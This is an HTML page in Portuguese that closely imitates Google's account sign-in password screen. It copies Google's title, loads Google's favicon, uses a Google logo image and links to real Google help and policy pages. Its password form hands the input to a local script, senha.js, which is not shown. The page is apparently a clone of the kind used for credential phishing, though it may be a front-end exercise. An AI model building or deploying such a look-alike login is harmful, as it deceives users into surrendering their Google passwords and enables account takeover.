<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <!-- Favicon -->
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">

    <!-- Arquivo CSS -->
    <link rel="stylesheet" href="css/login.css">
    <link rel="stylesheet" href="css/senha.css">

    <title>Fazer login nas contas do Google</title>
</head>
<body>
    <main>
        <header>
            <div id="logo">
                <figure>
                    <img src="img/logo_google.png" alt="logo do google" id="logo_google">
                </figure>
            </div>

            <div id="titulo">
                <h1>Olá!</h1>
            </div>

            <div id="conta" onclick="voltar()">
                <span id="e-mail">

                </span>

                <span>
                    <figure>
                        <img src="img/sinal-de-seta-para-baixo-para-navegar.png" alt="seta para baixo" id="seta_baixo">
                    </figure>
                </span>
            </div>
        </header>

        <div id="formulario">
            <form method="post" autocomplete="off" id="login">
                <input 
                type="password"
                name="user_senha"
                id="user"
                autocomplete="off"
                placeholder=""
                required>
                <label for="user" id="label_user">Senha</label>

                <!-- Menssagem de erro -->
                <span class="error-message" id="menssagem_error" aria-describedby="logo_erro texto_erro">
                    <span id="logo_erro">
                        <svg fill="currentColor" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">

                            </path>
                        </svg>
                    </span>
                    <span id="texto_erro">Digite sua Senha !</span>
                </span>

                <div id="mostrar_senha">
                    <input 
                    type="checkbox"
                    name="mostrar"
                    id="mostrar"
                    onchange="mostrarSenha()">
                    <label for="mostrar">Mostrar Senha</label>
                </div>
                <!-- Para mostrar a senha alterar o type do input -->

                <div id="btns">
                    <span id="esqueceu_senha">
                        <a href="#">Esqueceu a senha?</a>
                    </span>

                    <button type="submit" id="avancar" onclick="enviarSenha(event)">
                        Avançar
                    </button>      
                </div>
            </form>
        </div>
    </main>

    <div id="outros">
        <div id="selecionar_idioma">
            <select name="idioma" id="idioma">
                <option value="pt-br">Português (Brasil)</option>
            </select>
        </div>

        <div id="politicas">
            <ul>
                <li><a href="https://support.google.com/accounts?hl=pt-BR&visit_id=638544889213654870-204264878&rd=2&p=account_iph#topic=3382296">Ajuda</a></li>

                <li><a href="https://policies.google.com/privacy?gl=BR&hl=pt-BR">Privacidade</a></li>

                <li><a href="https://policies.google.com/terms?gl=BR&hl=pt-BR">Termos</a></li>
            </ul>
        </div>
    </div>

    <script src="js/senha.js"></script>
</body>
</html>
